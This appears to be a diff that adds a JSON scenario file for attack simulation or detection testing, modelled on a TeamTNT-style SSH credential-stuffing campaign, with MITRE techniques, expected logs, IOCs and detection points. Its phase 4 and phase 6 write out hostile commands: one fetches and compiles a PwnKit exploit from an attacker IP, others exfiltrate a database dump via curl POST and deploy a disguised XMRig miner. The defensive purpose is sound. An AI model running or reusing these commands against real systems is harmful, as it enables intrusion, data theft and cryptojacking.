@@ -1,0 +1,246 @@
+{
+  "id": "sc-bruteforce-001",
+  "name": "Distributed SSH Brute Force with Credential Stuffing",
+  "description": "A large-scale distributed SSH brute force and credential stuffing campaign targeting internet-facing Linux servers, modeled after real-world attacks documented by SANS Internet Storm Center and Shodan honeypot data. Attackers use compromised botnet nodes to rotate source IPs and evade rate limiting, followed by cryptocurrency miner deployment and lateral movement to internal database servers. This pattern matches campaigns attributed to TeamTNT and similar threat groups.",
+  "severity": "high",
+  "category": "credential_access",
+  "threat_actor": {
+    "name": "TeamTNT",
+    "aliases": ["TeamTNT", "Chimaera"],
+    "origin": "Germany",
+    "motivation": "Financial (Cryptojacking)",
+    "active_since": "2019"
+  },
+  "references": [
+    "https://attack.mitre.org/groups/G0139/",
+    "https://www.cadosecurity.com/blog/team-tnt-the-first-crypto-mining-worm-to-steal-aws-credentials",
+    "https://isc.sans.edu/diary/SSH+Brute+Force+Attacks/29234",
+    "https://www.trendmicro.com/en_us/research/21/k/teamtnt-upgrades-arsenal.html"
+  ],
+  "kill_chain": ["reconnaissance", "delivery", "exploitation", "installation", "lateral_movement", "actions_on_objectives"],
+  "phases": [
+    {
+      "phase": 1,
+      "name": "Masscan Port Discovery",
+      "description": "Attacker uses Masscan and ZMap to rapidly scan large IP ranges for exposed SSH services (port 22) and alternative SSH ports (2222, 2200). Scanning originates from multiple botnet nodes to distribute the scan load and avoid IP-based blocking. This mirrors real TeamTNT reconnaissance patterns observed in Shodan data.",
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery",
+      "tactic": "Discovery",
+      "target_host": "srv-web-01",
+      "target_user": null,
+      "delay_seconds": 0,
+      "stealth_level": "low",
+      "expected_logs": [
+        {"type": "firewall", "description": "SYN packets from multiple source IPs to port 22", "event_id": "Firewall Connection Log"},
+        {"type": "network", "description": "SYN scan pattern: high packet rate, no completed handshakes", "event_id": "IDS Alert (Suricata ET SCAN)"},
+        {"type": "ids", "description": "Suricata alert: ET SCAN Potential SSH Scan", "event_id": "Suricata SID:2001219"},
+        {"type": "authentication", "description": "Connection attempts logged by sshd", "event_id": "Linux auth.log"},
+        {"type": "firewall", "description": "Rate-limiting triggered on firewall for port 22", "event_id": "iptables LOG"}
+      ],
+      "indicators": {
+        "source_ips": ["91.215.85.17", "91.215.85.22", "45.77.65.211", "185.220.101.88"],
+        "ports_scanned": [22, 2222, 2200, 8022],
+        "scan_type": "SYN",
+        "scan_tool": "Masscan/ZMap",
+        "packets_per_second": 10000
+      },
+      "ioc": {
+        "domains": [],
+        "ips": ["91.215.85.17", "91.215.85.22", "45.77.65.211", "185.220.101.88"],
+        "file_hashes": {}
+      }
+    },
+    {
+      "phase": 2,
+      "name": "Distributed SSH Credential Stuffing",
+      "description": "Attacker launches a distributed credential stuffing attack using leaked credential databases (from prior breaches like RockYou2021 and LinkedIn 2012 dump). The attack rotates through botnet IPs to stay under fail2ban thresholds (typically 5 attempts per IP). Hydra and custom Python scripts are used with a curated wordlist targeting common Linux service accounts.",
+      "technique_id": "T1110.004",
+      "technique_name": "Brute Force: Credential Stuffing",
+      "tactic": "Credential Access",
+      "target_host": "srv-web-01",
+      "target_user": "root",
+      "delay_seconds": 60,
+      "stealth_level": "medium",
+      "expected_logs": [
+        {"type": "authentication", "description": "Failed SSH login for root from 91.215.85.17", "event_id": "Linux auth.log (sshd Failed password)"},
+        {"type": "authentication", "description": "Failed SSH login attempts for multiple usernames", "event_id": "Linux auth.log (sshd Invalid user)"},
+        {"type": "security", "description": "fail2ban jail triggered for SSH", "event_id": "fail2ban.log"},
+        {"type": "authentication", "description": "PAM authentication failure for deploy account", "event_id": "Linux auth.log (PAM)"},
+        {"type": "ids", "description": "Suricata alert: ET COMPROMISED Known hostile host", "event_id": "Suricata SID:2500000"}
+      ],
+      "indicators": {
+        "source_ips": ["91.215.85.17", "91.215.85.22", "45.77.65.211", "185.220.101.88", "194.36.209.41"],
+        "total_attempts": 4500,
+        "attempts_per_ip": 15,
+        "usernames_tried": ["root", "admin", "ubuntu", "deploy", "www-data", "git", "jenkins", "postgres", "docker", "ansible"],
+        "time_window_seconds": 1800,
+        "credential_source": "RockYou2021 + LinkedIn2012 combo list",
+        "tool": "Hydra 9.4"
+      },
+      "ioc": {
+        "domains": [],
+        "ips": ["91.215.85.17", "91.215.85.22", "45.77.65.211", "185.220.101.88", "194.36.209.41"],
+        "file_hashes": {}
+      }
+    },
+    {
+      "phase": 3,
+      "name": "Successful SSH Authentication",
+      "description": "Attacker successfully authenticates to the deploy service account using a reused password from a previous LinkedIn breach. The password 'Deploy2019!' was found in the credential stuffing database and matched the unchanged service account password.",
+      "technique_id": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "tactic": "Initial Access",
+      "target_host": "srv-web-01",
+      "target_user": "deploy",
+      "delay_seconds": 300,
+      "stealth_level": "medium",
+      "expected_logs": [
+        {"type": "authentication", "description": "Successful SSH login for deploy from 91.215.85.17 after 4500 failures", "event_id": "Linux auth.log (sshd Accepted password)"},
+        {"type": "security", "description": "New session opened for user deploy", "event_id": "Linux auth.log (systemd-logind New session)"},
+        {"type": "process", "description": "bash shell spawned for deploy user", "event_id": "Linux auditd EXECVE"},
+        {"type": "authentication", "description": "SSH session established from Tor exit node IP", "event_id": "Linux lastlog/wtmp"}
+      ],
+      "indicators": {
+        "source_ip": "91.215.85.17",
+        "username": "deploy",
+        "auth_method": "password",
+        "password_origin": "LinkedIn 2012 breach credential reuse",
+        "session_id": "pts/0"
+      },
+      "ioc": {
+        "domains": [],
+        "ips": ["91.215.85.17"],
+        "file_hashes": {}
+      }
+    },
+    {
+      "phase": 4,
+      "name": "Privilege Escalation via CVE-2021-4034 (PwnKit)",
+      "description": "Attacker escalates privileges from the deploy service account to root using CVE-2021-4034 (PwnKit), a local privilege escalation vulnerability in polkit's pkexec utility. The exploit is downloaded from the attacker's staging server and compiled on the target. This CVE was widely exploited in real-world TeamTNT campaigns throughout 2022-2023.",
+      "technique_id": "T1068",
+      "technique_name": "Exploitation for Privilege Escalation",
+      "tactic": "Privilege Escalation",
+      "target_host": "srv-web-01",
+      "target_user": "deploy",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "expected_logs": [
+        {"type": "process", "description": "curl downloading exploit from 91.215.85.17:8080/pwnkit.c", "event_id": "Linux auditd EXECVE"},
+        {"type": "process", "description": "gcc compilation of exploit binary", "event_id": "Linux auditd EXECVE"},
+        {"type": "process", "description": "pkexec executed with unusual arguments (CVE-2021-4034)", "event_id": "Linux auditd EXECVE"},
+        {"type": "security", "description": "UID change from 1001 (deploy) to 0 (root)", "event_id": "Linux auditd USER_AUTH"},
+        {"type": "process", "description": "New root shell spawned from pkexec context", "event_id": "Linux auditd EXECVE"}
+      ],
+      "indicators": {
+        "cve": "CVE-2021-4034",
+        "exploit_name": "PwnKit",
+        "commands": [
+          "curl -o /tmp/.pwnkit http://91.215.85.17:8080/pwnkit.c",
+          "gcc /tmp/.pwnkit -o /tmp/.pk",
+          "/tmp/.pk",
+          "id"
+        ],
+        "escalated_to": "root"
+      },
+      "ioc": {
+        "domains": [],
+        "ips": ["91.215.85.17"],
+        "file_hashes": {
+          "pwnkit_exploit_sha256": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
+        }
+      }
+    },
+    {
+      "phase": 5,
+      "name": "Lateral Movement to Database Server",
+      "description": "With root access on the web server, the attacker discovers database credentials in application configuration files (wp-config.php, .env files) and SSH keys in /root/.ssh/. They use these to pivot to the internal database server. The attacker also deploys the Diamorphine rootkit for persistence on the web server.",
+      "technique_id": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "tactic": "Lateral Movement",
+      "target_host": "srv-db-01",
+      "target_user": "root",
+      "delay_seconds": 180,
+      "stealth_level": "medium",
+      "expected_logs": [
+        {"type": "process", "description": "grep -r password /var/www/ searching for credentials", "event_id": "Linux auditd EXECVE"},
+        {"type": "file_access", "description": "Read access to /var/www/html/wp-config.php", "event_id": "Linux auditd OPEN"},
+        {"type": "authentication", "description": "SSH key-based login from srv-web-01 (10.0.1.50) to srv-db-01 (10.0.1.51)", "event_id": "Linux auth.log (sshd Accepted publickey)"},
+        {"type": "network", "description": "Internal SSH connection from web server to database server", "event_id": "Firewall Internal Log"},
+        {"type": "process", "description": "Diamorphine rootkit kernel module loaded via insmod", "event_id": "Linux dmesg/auditd MODULE_LOAD"}
+      ],
+      "indicators": {
+        "source_ip": "10.0.1.50",
+        "destination_ip": "10.0.1.51",
+        "protocol": "SSH",
+        "credential_source": "wp-config.php and /root/.ssh/id_rsa",
+        "rootkit": "Diamorphine LKM"
+      },
+      "ioc": {
+        "domains": [],
+        "ips": [],
+        "file_hashes": {
+          "diamorphine_ko_sha256": "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"
+        }
+      }
+    },
+    {
+      "phase": 6,
+      "name": "Database Dump and Cryptominer Deployment",
+      "description": "Attacker dumps the entire PostgreSQL database containing user credentials and PII, then deploys XMRig cryptocurrency miner on both compromised servers. The database dump is exfiltrated to the attacker's infrastructure, while the cryptominer generates Monero revenue. This dual-purpose attack (data theft + cryptojacking) is a hallmark of TeamTNT operations.",
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "tactic": "Impact",
+      "target_host": "srv-db-01",
+      "target_user": "root",
+      "delay_seconds": 120,
+      "stealth_level": "low",
+      "expected_logs": [
+        {"type": "database", "description": "pg_dumpall executed by root user", "event_id": "PostgreSQL Log"},
+        {"type": "process", "description": "pg_dumpall command execution", "event_id": "Linux auditd EXECVE"},
+        {"type": "network", "description": "Large outbound data transfer to 91.215.85.17", "event_id": "Firewall Egress Log"},
+        {"type": "process", "description": "XMRig miner process started as hidden service", "event_id": "Linux auditd EXECVE"},
+        {"type": "network", "description": "Stratum mining protocol connection to pool.minexmr.com:4444", "event_id": "IDS Alert (Suricata ET POLICY Cryptocurrency Miner)"}
+      ],
+      "indicators": {
+        "commands": [
+          "pg_dumpall -U postgres > /tmp/.db_backup.sql",
+          "gzip /tmp/.db_backup.sql",
+          "curl -X POST -F 'file=@/tmp/.db_backup.sql.gz' http://91.215.85.17:8080/upload",
+          "wget -q http://91.215.85.17:8080/xmrig -O /usr/local/bin/.kworker",
+          "/usr/local/bin/.kworker -o stratum+tcp://pool.minexmr.com:4444 -u 49JkPxxMfdFvDDe1mR...wallet_addr"
+        ],
+        "data_size_mb": 500,
+        "destination": "91.215.85.17",
+        "mining_pool": "pool.minexmr.com:4444",
+        "monero_wallet": "49JkPxxMfdFvDDe1mR..."
+      },
+      "ioc": {
+        "domains": ["pool.minexmr.com"],
+        "ips": ["91.215.85.17"],
+        "file_hashes": {
+          "xmrig_sha256": "e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
+          "db_dump_sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
+        }
+      }
+    }
+  ],
+  "mitre_techniques_summary": [
+    "T1046",
+    "T1110.004",
+    "T1078.003",
+    "T1068",
+    "T1021.004",
+    "T1496"
+  ],
+  "expected_detection_points": [
+    "Distributed port scan from multiple known-malicious IPs",
+    "SSH brute force pattern with IP rotation to evade fail2ban",
+    "Successful SSH login from known threat IP after brute force pattern",
+    "CVE-2021-4034 PwnKit privilege escalation (pkexec abuse)",
+    "Credential harvesting from application configuration files",
+    "Unusual internal SSH lateral movement (web server to database)",
+    "Diamorphine rootkit kernel module loading",
+    "PostgreSQL database dump and outbound exfiltration",
+    "XMRig cryptocurrency miner deployment and Stratum protocol traffic"
+  ]
+}
